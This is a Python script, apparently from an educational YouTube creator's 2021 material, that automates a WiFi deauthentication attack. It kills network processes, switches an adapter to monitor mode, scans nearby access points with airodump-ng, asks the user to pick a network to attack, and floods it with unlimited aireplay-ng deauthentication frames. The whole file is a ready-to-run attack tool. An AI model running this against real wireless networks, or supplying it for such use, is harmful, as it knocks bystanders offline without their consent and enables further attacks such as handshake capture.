#!/usr/bin/env python3
import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime

# Global variable to hold active wireless networks
active_wireless_networks = []

# Function to check if ESSID is already in the list
def check_for_essid(essid, lst):
    return all(essid not in item["ESSID"] for item in lst)

# Basic user interface header
def print_header():
    print(r"""______            _     _  ______                 _           _ 
|  _  \          (_)   | | | ___ \               | |         | |
| | | |__ ___   ___  __| | | |_/ / ___  _ __ ___ | |__   __ _| |
| | | / _` \ \ / / |/ _` | | ___ \/ _ \| '_ ` _ \| '_ \ / _` | |
| |/ / (_| |\ V /| | (_| | | |_/ / (_) | | | | | | |_) | (_| | |
|___/ \__,_| \_/ |_|\__,_| \____/ \___/|_| |_| |_|_.__/ \__,_|_|""")
    print("\n****************************************************************")
    print("\n* Copyright of David Bombal, 2021                              *")
    print("\n* https://www.davidbombal.com                                  *")
    print("\n* https://www.youtube.com/davidbombal                          *")
    print("\n****************************************************************")


# Ensure script is run with superuser privileges
def check_sudo():
    if 'SUDO_UID' not in os.environ:
        print("Try running this program with sudo.")
        exit()

# Backup existing CSV files
def backup_csv_files():
    for file_name in os.listdir():
        if file_name.endswith(".csv"):
            print("Found existing .csv files, moving to backup.")
            directory = os.getcwd()
            backup_folder = os.path.join(directory, "backup")
            os.makedirs(backup_folder, exist_ok=True)
            timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
            shutil.move(file_name, os.path.join(backup_folder, f"{timestamp}-{file_name}"))

# Get the list of wireless interfaces
def get_wifi_interfaces():
    wlan_pattern = re.compile("^wlan[0-9]+")
    check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
    if not check_wifi_result:
        print("Please connect a WiFi controller and try again.")
        exit()
    return check_wifi_result

# Select the WiFi interface
def select_wifi_interface(interfaces):
    print("The following WiFi interfaces are available:")
    for index, item in enumerate(interfaces):
        print(f"{index} - {item}")
    while True:
        try:
            choice = int(input("Please select the interface you want to use for the attack: "))
            if interfaces[choice]:
                return interfaces[choice]
        except (ValueError, IndexError):
            print("Invalid choice. Please enter a number corresponding to the available interfaces.")

# Kill conflicting processes
def kill_conflicting_processes():
    print("Killing conflicting processes...")
    subprocess.run(["sudo", "airmon-ng", "check", "kill"])

# Put WiFi adapter into monitor mode
def start_monitor_mode(interface):
    print(f"Putting {interface} into monitor mode...")
    subprocess.run(["sudo", "airmon-ng", "start", interface])

# Discover access points
def discover_access_points(interface):
    print("Starting access point discovery...")
    return subprocess.Popen(
        ["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", interface + "mon"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

# Display the access points found
def display_access_points():
    try:
        while True:
            subprocess.call("clear", shell=True)
            for file_name in os.listdir():
                if file_name.endswith(".csv"):
                    with open(file_name) as csv_file:
                        csv_reader = csv.DictReader(csv_file, fieldnames=['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key'])
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                continue
                            if row["BSSID"] == "Station MAC":
                                break
                            if check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)
            print("Scanning. Press Ctrl+C when you want to select which wireless network to attack.\n")
            print("No |\tBSSID              |\tChannel|\tESSID")
            print("___|\t___________________|\t_______|\t______________________________|")
            for index, item in enumerate(active_wireless_networks):
                print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nReady to make a choice.")

# Select the network to attack
def select_network_to_attack():
    while True:
        try:
            choice = int(input("Please select a network from above: "))
            if active_wireless_networks[choice]:
                return active_wireless_networks[choice]["BSSID"], active_wireless_networks[choice]["channel"].strip()
        except (ValueError, IndexError):
            print("Invalid choice. Please try again.")

# Deauthenticate clients
def deauthenticate_clients(bssid, channel, interface):
    print("Changing to the target channel...")
    subprocess.run(["airmon-ng", "start", interface + "mon", channel])
    print("Starting deauthentication attack...")
    deauth_process = subprocess.Popen(
        ["aireplay-ng", "--deauth", "0", "-a", bssid, interface + "mon"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    try:
        while True:
            print("Deauthenticating clients... Press Ctrl+C to stop.")
            time.sleep(5)
    except KeyboardInterrupt:
        print("Stopping deauthentication and monitor mode...")
        deauth_process.terminate()
        subprocess.run(["airmon-ng", "stop", interface + "mon"])
        print("Exiting...")

def main():
    print_header()
    check_sudo()
    backup_csv_files()
    interfaces = get_wifi_interfaces()
    hacknic = select_wifi_interface(interfaces)
    kill_conflicting_processes()
    start_monitor_mode(hacknic)
    discover_access_points(hacknic)
    display_access_points()
    hackbssid, hackchannel = select_network_to_attack()
    deauthenticate_clients(hackbssid, hackchannel, hacknic)

if __name__ == "__main__":
    main()
